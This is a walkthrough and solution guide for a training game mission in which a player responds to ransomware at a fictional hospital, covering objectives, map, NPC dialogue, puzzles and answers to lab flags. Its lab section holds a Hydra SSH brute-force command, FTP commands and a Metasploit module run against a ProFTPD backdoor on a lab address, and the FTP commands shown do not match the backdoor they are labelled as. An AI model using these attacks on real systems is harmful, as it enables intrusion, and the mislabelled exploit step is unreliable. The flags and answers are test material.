# Mission 2: "Ransomed Trust" - Complete Solution Guide

> ⚠️ **STALE — predates the 2026-08 rewrite.** The mission was restructured: the cover-story
> premise changed (the access-control server is encrypted, so nobody can *grant* access), the
> aim/task IDs changed, Dr. Kim's office is now unlocked, the IT department is gated behind
> Bernie Nwosu's override key, the boardroom is PIN-locked, a cover-burn beat was added after
> `talk_to_gary`, and several characters were renamed. Use `TESTING_WALKTHROUGH.md` as the
> authoritative critical-path reference until this guide is rewritten.

**Mission ID:** m02_ransomed_trust
**Difficulty:** Beginner (Mission 2 of Season 1)
**Estimated Playtime:** 50-70 minutes
**ENTROPY Cell:** Ransomware Incorporated
**SecGen Scenario:** "Rooting for a Win"

---

## Table of Contents

1. [Mission Overview](#mission-overview)
2. [Objectives & Tasks](#objectives--tasks)
3. [Room Layout Diagram](#room-layout-diagram)
4. [Step-by-Step Walkthroughs](#step-by-step-walkthroughs)
   - [Optimal Path (Stealth)](#optimal-path-stealth)
   - [Combat Path](#combat-path)
   - [Social Engineering Path](#social-engineering-path)
5. [NPC Interaction Guide](#npc-interaction-guide)
6. [Puzzle Solutions](#puzzle-solutions)
7. [VM Challenge Solutions](#vm-challenge-solutions)
8. [LORE Fragment Locations](#lore-fragment-locations)
9. [Moral Choices & Consequences](#moral-choices--consequences)
10. [Complete Item List](#complete-item-list)

---

## Mission Overview

### The Crisis

**St. Catherine's Regional Medical Center** has been hit by ransomware. ENTROPY's **Ransomware Incorporated** cell has encrypted all patient records and backup systems.

**Critical Stakes:**
- **47 patients on life support**
- **12 hours of backup power remaining**
- **Patient death probability:** 0.3% per hour (Ghost's calculation)
- **Ransom demand:** £150,000, payable in Bitcoin

**Your Mission:**
Recover decryption keys and advise hospital board on ransom payment decision before backup power fails.

### Mission Objective

**Primary Goal:** Recover hospital systems and make critical ethical decisions about ransomware payment.

**Success Criteria:**
- **Minimal (60%):** Recover both digital and physical encryption keys, make ransom decision
- **Standard (80%):** Complete all VM challenges, all core in-game challenges, both moral choices
- **Perfect (100%):** All VM flags, all LORE fragments, Gary protected, never detected by guard

---

## Objectives & Tasks

### Objective 1: Infiltrate Hospital
**Status:** Active at mission start
**Description:** Enter St. Catherine's Regional Medical Center and meet key staff

#### Tasks:
1. **Arrive at hospital reception** (auto-completes on spawn)
   - Type: Enter room
   - Target: reception_lobby

2. **Meet Dr. Sarah Kim (Hospital CTO)**
   - Type: NPC conversation
   - Target: dr_sarah_kim in dr_kim_office
   - Unlocks: Access to IT infrastructure

3. **Interview IT administrator Gary Whitlock**
   - Type: NPC conversation
   - Target: gary_whitlock in it_department
   - Unlocks: Password hints, server room access options

---

### Objective 2: Access IT Systems
**Status:** Unlocked after meeting Dr. Kim
**Description:** Gain access to hospital's IT infrastructure and server room

#### Tasks:
1. **Gather SSH password hints from Gary**
   - Type: Collect items or NPC dialogue
   - Sources:
     - Gary's desk sticky notes (requires lockpicking)
     - High-trust Gary dialogue (social engineering)
   - Hints: "Emma2018", "Hospital1987", "StCatherines"

2. **Decode Base64 ransomware message**
   - Type: Custom (use CyberChef workstation)
   - Location: Infected terminal in IT Department
   - Educational: Teaches Base64 decoding

3. **Access the server room**
   - Type: Enter room
   - Methods:
     - **High Trust:** Gary gives server_room_keycard
     - **Medium/Low Trust:** Lockpick door (medium difficulty)

---

### Objective 3: Exploit ENTROPY's Backdoor
**Status:** Unlocked after accessing server room
**Description:** Use ProFTPD vulnerability to access encrypted backups

#### Tasks:
1. **Submit SSH access flag**
   - Type: Submit flags
   - VM Challenge: SSH password cracking or Hydra brute force
   - Flag: `flag{ssh_access_granted}`
   - Reward: ENTROPY server credentials intercepted

2. **Submit ProFTPD exploitation flag**
   - Type: Submit flags
   - VM Challenge: Exploit ProFTPD 1.3.3c backdoor
   - Flag: `flag{proftpd_backdoor_exploited}`
   - Reward: Shell access to backup server

3. **Submit database backup flag**
   - Type: Submit flags
   - VM Challenge: Navigate to /var/backups, find encrypted database files
   - Flag: `flag{database_backup_located}`
   - Reward: Intel reveals safe location (Emergency Equipment Storage)

4. **Submit Ghost's operational log flag**
   - Type: Submit flags
   - VM Challenge: Find Ghost's operational log in /var/backups/
   - Flag: `flag{ghost_operational_log}`
   - Reward: Unlocks "Ghost's Manifesto" LORE fragment

---

### Objective 4: Recover Offline Backup Keys
**Status:** Unlocked after submitting database backup flag
**Description:** Find and crack PIN safe for offline backup encryption keys

#### Tasks:
1. **Locate PIN safe in Emergency Equipment Storage**
   - Type: Enter room
   - Target: emergency_equipment_storage
   - Route: hallway_south → emergency_equipment_storage

2. **Find clues for 4-digit safe PIN**
   - Type: Custom
   - Clue Locations:
     - **Clue 1:** Hospital founding plaque in reception_lobby: "Founded 1987"
     - **Clue 2:** Dr. Kim's sticky note: "Safe combination: founding year"
     - **Red Herring:** Gary's daughter photo: "Emma - 7th birthday! 05/17/2018"
   - Answer: **1987**

3. **Crack PIN safe (code: 1987)**
   - Type: Unlock object
   - Target: emergency_storage_safe
   - Methods:
     - **Primary:** Enter PIN 1987
     - **Fallback:** Use PIN cracker device (2-minute brute force)
   - Reward: Offline backup encryption keys (USB drive)

---

### Objective 5: Make Critical Decisions
**Status:** Unlocked after both Objectives 3 and 4 complete
**Description:** Decide how to recover hospital systems and handle the crisis

#### Tasks:
1. **Decide on ransom payment**
   - Type: Custom
   - Location: Ransom Interface Terminal in server_room
   - Options:
     - **Pay Ransom:** £150,000 in Bitcoin, 1-2 patient deaths, 2-4 hour recovery, ENTROPY funded
     - **Manual Recovery:** £0 to ENTROPY, 4-6 patient deaths, 12-hour recovery, deny funding
   - Tracked: `paid_ransom` global variable

2. **Decide whether to expose hospital negligence**
   - Type: Custom
   - Location: Closing debrief conversation
   - Options:
     - **Expose:** Public scandal, Dr. Kim fired, sector-wide security improvements
     - **Quiet Resolution:** Dr. Kim keeps job, internal improvements only
   - Tracked: `exposed_hospital` global variable

---

## Room Layout Diagram

```
                    LEGEND
                    ======
    [Room Name]     Room
    ─────────       Door/Connection
    ▓▓▓▓▓▓▓▓       Locked Door
    👤              NPC
    🔒              Lockpickable Container
    🔑              Key Item
    💻              Terminal/Computer
    🚨              Security Guard
    📦              Container/Safe


                ST. CATHERINE'S REGIONAL MEDICAL CENTER
                        ADMINISTRATIVE WING
                ========================================

    Layout verified overlap-free by scripts/validate_scenario.rb
    (room geometry check). Start room: RECEPTION LOBBY.


        WEST WING              CENTRE COLUMN            EAST WING

     ┌───────────┐            ┌───────────┐
     │CONFERENCE │            │  SERVER   │ ▓ LOCKED (RFID keycard
     │   ROOM    │            │   ROOM    │   from Gary, or pick)
     │ 💻 Press  │            │ 💻 VM Term│
     │   Terminal│            │ 💻 Drop-  │
     │ 📦 Board  │            │    Site   │
     │   liability            │ 💻 CyberChef
     │   + budget│            │ 💻 Recovery
     └─────┬─────┘            │    Console│
           │ N                └─────┬─────┘
     ┌─────┴─────┐            ┌─────┴─────┐
     │ DR. KIM'S │ ▓ LOCKED   │  HALLWAY  │ 🚨 Security guard
     │   OFFICE  │ (lockpick) │   NORTH   │    (patrol)
     │ 👤 Dr.Kim │            └─────┬─────┘
     │ 🔒 Safe   │                  │ S
     │   (1987)  │            ┌─────┴─────┐         ┌───────────┐
     │ 📦 ZDS    │   (E→)     │ RECEPTION │  (E→)   │    IT     │ ▓ LOCKED
     │   Invoice │───────────►│   LOBBY   │────────►│ DEPARTMENT│ (lockpick)
     └───────────┘   dr_kim   │ 👤 Briefing         │ 👤 Gary │
                     ↔ recept │ 👤 Recept.│  reception│ 🔒 Filing │
                              │ 📦 Plaque │  ↔ IT     │   Cabinet │
                              │   "1987"  │         │ 📦 Pwd    │
                              │ 🔑 Lockpick│         │   sticky  │
                              └─────┬─────┘         │ 💻 Infected
                                    │ S             └───────────┘
                              ┌─────┴─────────────┐
                              │   PATIENT WARD    │ (double-wide, 4 GU)
                              │ 👤 Ward Nurse     │
                              │ 👤 Patients (beds)│
                              │ 💻 EHR Terminal   │
                              └─────┬─────────────┘
                                    │ S
                              ┌─────┴─────┐
                              │  HALLWAY  │
                              │   SOUTH   │
                              │ 📦 Nurse's│
                              │    note   │
                              └─────┬─────┘
                                    │ S
                              ┌─────┴─────┐
                              │ EMERGENCY │
                              │  STORAGE  │
                              │ 🔒 Safe   │
                              │   (1987)  │
                              │ 🔑 Offline│
                              │   Keys    │
                              │ 📦 PIN    │
                              │   Cracker │
                              └───────────┘

    CONNECTIONS (reciprocal doors)
    ==============================
    Reception   —N→ Hallway North   —N→ Server Room (RFID/pick)
    Reception   —E→ IT Department (pick)          [single-door]
    Reception   —W→ Dr. Kim's Office (pick) —N→ Conference Room
    Reception   —S→ Patient Ward —S→ Hallway South —S→ Emergency Storage

    ROOM DIMENSIONS (real tilemap size, in Grid Units — GU)
    =======================================================
    Reception Lobby:      2 × 2 GU   (room_reception)
    IT Department:        2 × 2 GU   (room_office)
    Server Room:          2 × 2 GU   (room_servers)
    Dr. Kim's Office:     2 × 2 GU   (room_office)
    Conference Room:      2 × 2 GU   (room_meeting)
    Patient Ward:         4 × 2 GU   (room_hospital_ward, double-wide)
    Emergency Storage:    1 × 1 GU   (room_hospital_storage_1x1gu)
    Hallway North/South:  2 × 1 GU   (hall_1x2gu)

    LOCK TYPES & DIFFICULTY
    =======================
    IT Filing Cabinet:        Lockpick (Easy)
    IT Department Door:       Lockpick (Easy - Tutorial)
    Dr. Kim's Office Door:    Lockpick (Medium)
    Server Room Door:         RFID Keycard OR Lockpick (Medium)
    Emergency Safe:           PIN 1987 OR PIN Cracker Device
    Dr. Kim's Safe:           PIN 1987 (Optional LORE)

    GUARD PATROL ROUTE (Hallway North)
    ===================================
    Start: (10, 2) Center
    → Waypoint 1: (3, 2) Left end (20-tick pause)
    → Waypoint 2: (10, 2) Center (20-tick pause)
    → Waypoint 3: (17, 2) Right end (20-tick pause)
    → Loop back to Waypoint 2, then repeat

    Speed: 40 pixels/sec
    Total Loop Time: ~60 seconds
    LOS: 150px range, 120° cone (visualized)
```

---

## Step-by-Step Walkthroughs

### Optimal Path (Stealth)
**Estimated Time:** 50-60 minutes
**Approach:** Avoid combat, high social engineering, collect all LORE
**Difficulty:** Medium (requires timing guard patrol)

#### Phase 1: Initial Investigation (0-10 minutes)

**Step 1:** Spawn in Reception Lobby
- Task `arrive_at_hospital` auto-completes
- Read hospital founding plaque: **"Founded 1987"** (PIN Clue #1 - CRITICAL)
- Read visitor sign-in log (narrative flavor)
- Read building directory (NPC locations)

**Step 2:** Meet Dr. Sarah Kim (West door)
- Enter dr_kim_office
- Talk to Dr. Kim: Choose "I'm here to help with the ransomware crisis"
- Learn about 47 patients, 12-hour deadline
- Kim grants authorization to investigate
- Task `meet_dr_kim` completes
- **Optional:** Browse budget documents (reveals hospital negligence)

**Step 3:** Meet Gary Whitlock (East door from Reception)
- Enter it_department (door unlocked, tutorial lockpicking optional)
- Talk to Gary: Choose empathetic dialogue options
- Build trust by asking about warnings he sent (+10 influence)
- Acknowledge he tried to prevent this (+15 influence)
- Gary explains ProFTPD vulnerability
- **Goal:** Get gary_influence ≥ 40 for server room keycard

**Step 4:** Gather Password Hints (Two Methods)

**Method A: Social Engineering (High Trust Path)**
- Continue Gary dialogue
- Choose: "I need your help accessing the backup server"
- Gary shares password hints verbally:
  - "Emma2018" (daughter's name + birth year)
  - "Hospital1987" (founding year)
  - "StCatherines" (hospital name)
- Gary gives server_room_keycard (skip lockpicking later!)
- Task `obtain_password_hints` completes

**Method B: Investigation (Low Trust Path)**
- Lockpick Gary's desk drawer (easy difficulty)
- Find password sticky notes
- Read Emma's photo frame: "Emma - 7th birthday! 05/17/2018"
- Task `obtain_password_hints` completes
- **Note:** Must lockpick server room door later (medium difficulty)

#### Phase 2: Server Room Access (10-25 minutes)

**Step 5:** Decode Ransomware Note (Optional but Educational)
- Use infected terminal in IT Department
- Note displays Base64-encoded message:
  ```
  WU9VUiBQQVRJRU5UIFJFQ09SRFMgQVJFIEVOQ1JZUFRFRC4gNDcgUEFUSUVOVFMgT04gTElGRSBTVVBQT1JULiAxMiBIT1VSUyBPRiBCQUNLVVAgUE9XRVIuIFBBWSAyLjUgQlRDIFRPIFtXQUxMRVRdIE9SIFdBVENIIFRIRU0gRElFLiAtIFJBTlNPTVdBUkUgSU5DT1JQT1JBVEVE
  ```
- Open CyberChef workstation (in server room later)
- Use "From Base64" operation
- Decoded: "YOUR PATIENT RECORDS ARE ENCRYPTED. 47 PATIENTS ON LIFE SUPPORT. 12 HOURS OF BACKUP POWER. PAY £150,000 IN BITCOIN TO [WALLET] OR WATCH THEM DIE. - RANSOMWARE INCORPORATED"
- Task `decode_ransomware_note` completes

**Step 6:** Navigate to Server Room (STEALTH CRITICAL)
- From Reception, go north into hallway_north (the server room sits north of this corridor)
- **SECURITY GUARD PATROL ACTIVE**
- Observe guard patrol pattern (60-second loop)
- **Timing Strategy:**
  - Wait for guard to patrol to one end of the corridor
  - Guard pauses 20 ticks at each waypoint
  - Sprint to the server room door (north connection) during a pause
  - Enter quickly before guard turns around

**Step 7A:** Enter Server Room (High Trust - Easy)
- If you have server_room_keycard from Gary:
  - Use keycard on RFID reader
  - Door unlocks, enter immediately
  - Task `access_server_room` completes

**Step 7B:** Enter Server Room (Low Trust - Lockpicking)
- If no keycard:
  - Wait for guard to patrol away
  - Start lockpicking (medium difficulty)
  - **WARNING:** If guard sees you lockpicking:
    - Guard triggers `lockpick_used_in_view` event
    - Confrontation dialogue opens
    - Options: Persuade (influence check), Back down, or Fight
  - Complete lockpick minigame
  - Task `access_server_room` completes

#### Phase 3: VM Challenges (25-50 minutes)

**Step 8:** Access VM Terminal
- Enter server_room
- Interact with "VM Access Terminal"
- SecGen scenario "Rooting for a Win" loads
- **Objective:** Complete 4 flags

**VM Challenge 1: SSH Access**
- IP: 192.168.100.50
- Username: Try common usernames (root, admin, gary, backup)
- Password: Use hints from Gary
  - Try: Emma2018 ✓ (likely correct)
  - Try: Hospital1987
  - Try: StCatherines
- **Alternative:** Use Hydra for brute force:
  ```bash
  hydra -l gary -P /usr/share/wordlists/rockyou.txt ssh://192.168.100.50
  ```
- Once logged in via SSH:
  - Flag revealed: `flag{ssh_access_granted}`
  - Go to drop-site terminal
  - Submit flag
  - Task `submit_ssh_flag` completes
  - **Reward:** ENTROPY server credentials intercepted

**VM Challenge 2: ProFTPD Exploitation**
- Service: ProFTPD 1.3.3c running on port 21
- Vulnerability: the ProFTPD 1.3.3c backdoor (backdoor command)
- **Exploitation Steps:**
  ```bash
  # Connect to FTP service
  nc 192.168.100.50 21

  # Send backdoor command
  SITE CPFR /etc/passwd
  SITE CPTO /var/tmp/passwd

  # Or use Metasploit:
  use exploit/unix/ftp/proftpd_133c_backdoor
  set RHOSTS 192.168.100.50
  set RPORT 21
  exploit
  ```
- Flag revealed: `flag{proftpd_backdoor_exploited}`
- Submit at drop-site terminal
- Task `submit_proftpd_flag` completes
- **Reward:** Shell access to backup server established

**VM Challenge 3: Database Backup Location**
- Navigate filesystem:
  ```bash
  cd /var/backups
  ls -la
  ```
- Find encrypted database files:
  - patient_records.db.enc
  - medical_systems.db.enc
  - backup_encryption_keys.txt (contains clue)
- Flag revealed: `flag{database_backup_located}`
- Submit at drop-site terminal
- Task `submit_database_flag` completes
- **Reward:** Intel reveals safe location (Emergency Equipment Storage, Administrative Wing)

**VM Challenge 4: Ghost's Operational Log**
- Still in /var/backups directory:
  ```bash
  cat operational_log.txt
  ```
- Read Ghost's manifesto (patient death calculations)
- Flag revealed: `flag{ghost_operational_log}`
- Submit at drop-site terminal
- Task `submit_ghost_log_flag` completes
- **Reward:** Unlocks "Ghost's Manifesto" LORE fragment

#### Phase 4: Offline Key Recovery (50-65 minutes)

**Step 9:** Navigate to Emergency Equipment Storage
- Exit server room, go south through hallway_north (avoid guard)
- Enter reception_lobby
- Go south into the Patient Ward (open access)
- Continue south to hallway_south
- Go south to emergency_equipment_storage
- Task `locate_safe` completes

**Step 10:** Gather PIN Clues (If Not Already Collected)
- **Clue 1** (Already found): Hospital plaque "Founded 1987"
- **Clue 2:** Return to dr_kim_office
  - Find sticky note on desk: "Safe combination: founding year"
  - Confirms answer is 1987
- **Red Herring:** Gary's photo shows 2018 (wrong answer)
- Task `gather_pin_clues` completes

**Step 11:** Crack Emergency Storage Safe
- Interact with "Emergency Equipment Storage Safe"
- Enter PIN: **1987**
- **Alternative:** Use PIN cracker device (found in same room)
  - Automated brute force
  - Takes ~2 minutes game time
- Safe opens
- Collect: **Offline Backup Encryption Keys** (USB drive)
- Task `crack_safe_pin` completes
- Global variable `offline_keys_recovered` = true

#### Phase 5: Critical Decisions (65-70 minutes)

**Step 12:** Access Ransom Decision Terminal
- Return to server_room
- Interact with "Hospital Recovery Interface" terminal
- **CRITICAL MORAL CHOICE:**

**Option A: Pay Ransom (£150,000, payable in Bitcoin)**
- Consequences:
  - **Immediate:** Systems restore in 2-4 hours
  - **Patient Deaths:** 1-2 deaths (cardiac arrest during transition)
  - **ENTROPY Funding:** £150,000 to Ransomware Incorporated
  - **Hospital:** Budget depleted, security upgrade postponed
  - **Dr. Kim:** Guilt over payment, job secure
  - **Long-term:** Ransomware Incorporated targets 12 more hospitals
- Global variable: `paid_ransom` = true

**Option B: Manual Recovery (Deny Ransom)**
- Consequences:
  - **Immediate:** Systems restore in 12 hours (offline keys + online keys)
  - **Patient Deaths:** 4-6 deaths (ventilator failures, dialysis complications)
  - **ENTROPY Funding:** £0 to Ransomware Incorporated (denied funding)
  - **Hospital:** £150,000 saved, security upgrade funded
  - **Dr. Kim:** Guilt over deaths, resignation likely
  - **Long-term:** Ransomware Incorporated operation disrupted (no funding)
- Global variable: `paid_ransom` = false

- Task `make_ransom_decision` completes

**Step 13:** Closing Debrief (Auto-triggered)
- Agent 0x99 calls via phone
- Reviews mission outcomes
- Acknowledges your ransom choice
- **Second Moral Choice:** Expose hospital negligence?

**Option A: Expose Hospital Publicly**
- Consequences:
  - Dr. Kim fired, hospital board investigated
  - Sector-wide security improvements (200+ hospitals upgrade)
  - Public trust in healthcare cybersecurity damaged
- Global variable: `exposed_hospital` = true

**Option B: Quiet Resolution**
- Consequences:
  - Dr. Kim keeps job, internal improvements only
  - St. Catherine's upgrades security (£85K budget approved)
  - No sector-wide change, other hospitals remain vulnerable
- Global variable: `exposed_hospital` = false

- Task `decide_hospital_exposure` completes
- **MISSION COMPLETE**

#### Optional: LORE Fragment Collection

**LORE 1: Ghost's Manifesto** (Beginner difficulty)
- Location: VM filesystem /var/backups/operational_log.txt
- Requirement: Submit flag 4 (`ghost_operational_log`)
- Content: Patient death probability calculations (0.3% per hour)
- Connection: Ransomware Incorporated philosophy

**LORE 2: CryptoSecure Recovery Services** (Intermediate difficulty)
- Location: IT filing cabinet in it_department
- Requirement: Lockpick filing cabinet (easy)
- Content: Front company testimonials, previous hospital attacks
- Connection: Ransomware Incorporated's legitimate facade

**LORE 3: Zero Day Syndicate Invoice** (Intermediate difficulty)
- Location: Dr. Kim's safe in dr_kim_office
- Requirement: Enter PIN 1987 (same as emergency safe)
- Content: Invoice showing ZDS sold ProFTPD exploit to Ghost ($55K)
- Connection: Sets up Mission 3, reveals ENTROPY coordination

---

### Combat Path
**Estimated Time:** 45-55 minutes
**Approach:** Knock out security guard for unrestricted access
**Difficulty:** High risk (mission can fail)
**Consequences:** Tracked in endgame debrief

#### Differences from Optimal Path:

**Step 6 (Modified): Confront Security Guard**
- Navigate to hallway_north
- **DO NOT avoid guard** - approach directly
- Guard confronts you: "What brings you to this corridor?"
- Choose aggressive dialogue to trigger confrontation
- **OR:** Start lockpicking server room door while guard watches
  - Guard: "HEY! What the hell are you doing with those lockpicks?!"

**Step 7 (Combat): Fight the Guard**
- Dialogue option appears: **"Try to physically overpower the guard"**
- Sub-menu opens with combat options:

**Combat Option 1: Knockout Punch**
- Success threshold: `influence >= 20`
- **If successful:**
  - Guard unconscious for ~2 minutes
  - Complete server room access without interruption
  - Global variable: `guard_knocked_out` = true, `attacked_guard` = true
  - Task `neutralize_guard` completes
- **If failed:**
  - Guard blocks, calls backup
  - Player takes moderate damage
  - **MISSION FAILED:** "Attacked Security Personnel"
  - Game over

**Combat Option 2: Wrestling/Grappling**
- Success threshold: `influence >= 15`
- **If successful:**
  - Guard choked out, unconscious
  - Same rewards as knockout punch
- **If failed:**
  - Guard overpowers player
  - Mission failed

**Combat Option 3: Fire Extinguisher (Improvised Weapon)**
- Success threshold: `influence >= 25`
- **If successful:**
  - Two-hit knockout
  - Player receives fire_extinguisher item
  - Guard unconscious
- **If failed:**
  - Guard draws baton first, counterattacks
  - Player takes severe damage
  - Mission failed

**Step 8 (Post-Combat): Time-Limited Window**
- You have ~2 minutes before:
  - Guard wakes up OR
  - Another staff member finds unconscious guard
- Complete server room tasks quickly
- Access VM terminal
- Submit flags rapidly
- **Consequence:** Endgame debrief acknowledges violence used

#### Endgame Consequences:
- Agent 0x99: "You attacked hospital security. That complicates things."
- Hospital: Potential legal action, SAFETYNET reputation damaged
- Dr. Kim: Horrified at violence during crisis
- **Achievement:** "No Mercy" (knocked out civilian security)

---

### Social Engineering Path
**Estimated Time:** 55-65 minutes
**Approach:** Maximum dialogue, persuasion, no lockpicking
**Difficulty:** Low (safest path)
**Requirements:** Build influence with NPCs

#### Key Differences:

**Step 3 (Enhanced): Build Maximum Gary Trust**
- Spend extra time in Gary dialogue
- Choose ALL empathetic options:
  - "You tried to warn them - this isn't your fault" (+15 influence)
  - "I'll document your warnings to protect you" (+15 influence)
  - "Dr. Kim should have listened to you" (+10 influence)
- **Goal:** gary_influence >= 40
- **Reward:** Gary gives server_room_keycard AND password hints verbally
- **Bonus:** Gary offers to distract guard for you (guard patrol disabled temporarily)

**Step 4 (Enhanced): Build Dr. Kim Rapport**
- Return to dr_kim_office after meeting Gary
- Dialogue option: "I want to protect you from scapegoating"
- Choose: "Document your efforts to improve security"
- **Reward:** Dr. Kim provides admin passwords, safe combination (1987), emergency storage location
- No investigation needed - all answers given

**Step 6 (Modified): Guard Persuasion**
- Encounter guard in hallway_north
- High influence dialogue options available:
  - "Dr. Kim authorized my full access" (influence >= 30)
  - "I'm here to save 47 patients - help me do my job" (influence >= 25)
- **If gary_influence >= 40:** Gary vouches for you via radio
  - Guard: "Gary says you're legit. Alright, go ahead."
  - Guard steps aside
- Zero combat, zero lockpicking at guard checkpoint

**Result:** Fastest, safest path with maximum NPC cooperation

---

## NPC Interaction Guide

### Dr. Sarah Kim (Hospital CTO)
**Location:** dr_kim_office
**Role:** Mission authorization, guilt arc character

**Influence System:** 0-100 scale, starts at 50

**Key Dialogue Branches:**

**Initial Meeting:**
- "I'm here to help with the ransomware crisis" → +10 influence, mission authorization
- "What happened?" → Learn crisis details, neutral
- "Where's your IT team?" → Directed to Gary, neutral

**Mid-Mission (After Gary Warnings Discovered):**
- "Gary warned you about this vulnerability" → -10 influence, Kim becomes defensive
- "I can protect you from scapegoating" → +15 influence, unlocks alliance
- "You ignored security for budget reasons" → -20 influence, Kim hostile

**Guilt Revelation (High Influence Path):**
- Available if kim_influence >= 60
- Kim admits: "I should have listened to Gary. This is my fault."
- Kim provides safe combination (1987), emergency storage location
- Kim asks: "Can you keep Gary out of this investigation?"
  - "Yes, I'll protect him" → Gary protected in debrief
  - "No, truth must come out" → Gary exposed but vindicated

**Variables Tracked:**
- `kim_influence` (0-100)
- `kim_guilt_revealed` (boolean)
- `player_warned_kim` (boolean)

---

### Gary Whitlock (IT Administrator)
**Location:** it_department
**Role:** Password hints source, server room access, scapegoat victim

**Influence System:** 0-100 scale, starts at 30 (defensive)

**Key Dialogue Branches:**

**Initial Meeting:**
- "Did you see this attack coming?" → Gary explains ProFTPD warnings
- "Tell me about the vulnerability" → Technical details, +5 influence
- "This isn't your fault" → +15 influence, Gary opens up

**Password Hints (Unlocked at influence >= 40):**
- Gary: "I can share my password patterns if you need server access."
- Provides: Emma2018, Hospital1987, StCatherines
- Optional: Shows Emma's photo (daughter, 7th birthday 2018)

**Server Room Keycard (Unlocked at influence >= 45):**
- Gary: "I trust you. Here's my server room keycard. Full access."
- Gives: server_room_keycard (RFID)
- **Benefit:** Skip lockpicking, instant server room entry

**Scapegoating (Mid-Mission Discovery):**
- Find email in filing cabinet: "Board plans to fire Gary, blame him for attack"
- Return to Gary with info:
  - "I'll protect you - document your warnings" → gary_protected = true
  - "You should resign before they fire you" → Gary leaves, loses keycard access
  - "I can't help with that" → Gary scapegoated in debrief

**Variables Tracked:**
- `gary_influence` (0-100)
- `gary_trusts_player` (boolean)
- `gave_keycard` (boolean)
- `gary_defensive` (boolean)

---

### Security Guard (Patrol)
**Location:** hallway_north (patrol route)
**Role:** Security checkpoint, combat optional

**Influence System:** 0-100 scale, starts at 0 (neutral/suspicious)

**Patrol Behavior:**
- Route: (3,2) → (10,2) → (17,2) → loop
- Speed: 40 px/sec
- Pause: 20 ticks at each waypoint
- LOS: 150px range, 120° cone

**Initial Encounter:**
- Guard: "Hold on. This is a restricted area during the crisis. What's your business here?"
- Options:
  - "I'm the security consultant Dr. Kim called in" → +20 influence, ID badge check
  - "Just passing through, officer" → Neutral, guard skeptical
  - "Emergency - I need to access the server room" → +5 influence, authorization required
  - "None of your business" → -30 influence, hostile stance

**Lockpicking Detection Event:**
- Triggered if player uses lockpick within LOS
- Guard: "HEY! What the hell are you doing with those lockpicks?!"
- **First Offense Options:**
  - "I have authorization from Dr. Kim!" → Influence check (>= 30 success)
  - "I'm trying to recover critical patient data!" → Influence check (>= 25 success)
  - "I was just... looking for something I dropped" → -15 influence, poor excuse
  - "This is official security testing" → Influence check (>= 40 success)
  - "Back off - this is more important than you know" → -30 influence, hostile
  - **"Try to physically overpower the guard"** → Combat options

**Combat Options (Detailed in Combat Path above):**
- Knockout punch (influence >= 20 required)
- Wrestling/grappling (influence >= 15 required)
- Fire extinguisher (influence >= 25 required)
- Back down (de-escalation)

**Variables Tracked:**
- `guard_knocked_out` (boolean)
- `attacked_guard` (boolean)
- `confrontation_attempts` (counter)
- `caught_lockpicking` (boolean)

---

### Agent 0x99 (Handler - Phone)
**Location:** Phone contact (always available)
**Role:** Tutorial support, hints, mission briefing/debrief

**Key Features:**
- **Opening Briefing:** Act 1 emergency briefing
- **Mid-Mission Support:** Context-sensitive hints
- **Closing Debrief:** Outcome acknowledgment, choice review

**Event-Triggered Messages:**

**On First Lockpicking:**
- "Nice work on the lockpick. Remember, timing is key with guards around."

**On Guard Detection:**
- "You've been spotted! Use your cover story or de-escalate."

**On Server Room Access:**
- "You're in the server room. VM terminal should have access to ENTROPY's backdoor."

**On Flag Submission:**
- "Flag verified. Keep pushing - we're building a case against Ransomware Inc."

**Tutorial Dialogues (Available via Phone Menu):**

**Encoding vs. Encryption:**
- "Encoding transforms data for transmission. No secret key needed. Base64, ROT13, hex."
- "Encryption requires a secret key. Much more secure. AES, RSA, ChaCha20."
- "Use CyberChef to decode. It's an industry-standard tool."

**PIN Puzzle Hint (After 3 wrong attempts):**
- "Think about the hospital's history. When was it founded?"
- "Check the reception area for historical information."

**Gary Protection Reminder (After reading email archive):**
- "Gary warned them months ago. You could document that to protect him."
- "Decision is yours, but scapegoating the whistleblower sends a bad message."

---

### Ghost (Antagonist - Phone)
**Location:** Phone contact (appears mid-mission)
**Role:** Ransomware Incorporated representative, ideological counter

**First Contact:** Triggered after submitting database_flag (flag 3)

**Initial Message:**
- Ghost: "Interesting. You found the backup server. I calculated you had 34% chance."
- Ghost: "I'm Ghost. Ransomware Incorporated. Let's talk professionally."

**Key Dialogue Branches:**

**Philosophy:**
- Ghost: "St. Catherine's board never ran these numbers. They deferred £85K security spending for a £3.2M MRI."
- Ghost: "THEY gambled with patient safety. We're just making the stakes visible."

**Patient Death Calculations:**
- Ghost: "Of course I calculated probabilities. This is risk assessment, not recklessness."
- Ghost: "0.3% mortality per hour. 47 patients. 12-hour manual recovery = 4-6 deaths statistically."
- Ghost: "2-hour recovery with ransom payment = 1-2 deaths. You do the math."

**Persuasion Attempt (Pre-Ransom Decision):**
- Ghost: "Pay the ransom. It's the only rational choice."
- Ghost: "Saving lives justifies temporary funding. You can arrest me later."
- Player responses:
  - "You're manipulating me" → Ghost acknowledges, continues argument
  - "You created this crisis" → Ghost deflects blame to hospital board
  - "I won't negotiate with terrorists" → Ghost: "Then you choose the higher death count."

**Post-Decision Contact:**

**If Ransom Paid:**
- Ghost: "Smart choice. Decryption keys delivered. Systems restoring."
- Ghost: "1-2 patient deaths. Acceptable losses compared to alternative."
- Ghost: "Your £150,000 will fund operations that save 200-600 lives long-term."

**If Ransom Refused:**
- Ghost: "Disappointing. 4-6 deaths on your conscience."
- Ghost: "But I respect the principle. Healthcare sector needed this lesson."
- Ghost: "Next hospital won't make St. Catherine's mistakes."

**Variables Tracked:**
- `ghost_contacted_player` (boolean)
- `ghost_persuasion_attempted` (boolean)

---

## Puzzle Solutions

### PIN Safe Puzzle (Code: 1987)

**Puzzle Type:** 4-digit PIN safe (two safes use same code)
**Locations:**
- Emergency Equipment Storage (critical path)
- Dr. Kim's Office (optional LORE)

**Clue Locations:**

**Clue 1: Hospital Founding Plaque (Reception Lobby)**
- Object: "St. Catherine's Hospital Founding Plaque"
- Text: "ST. CATHERINE'S REGIONAL MEDICAL CENTER\nFounded 1987\nServing the Community for Over 35 Years"
- **Critical clue - available immediately at mission start**

**Clue 2: Dr. Kim's Sticky Note (Dr. Kim's Office)**
- Object: "Sticky Note on Dr. Kim's Desk"
- Text: "Safe combination: founding year\n(Emergency backup keys stored in Admin Wing)"
- **Confirmation clue - validates that 1987 is correct**

**Red Herring: Emma's Photo (IT Department)**
- Object: "Photo Frame - Emma's Birthday"
- Text: "Photo of young girl with birthday cake.\nHandwritten on back: 'Emma - 7th birthday! 05/17/2018'"
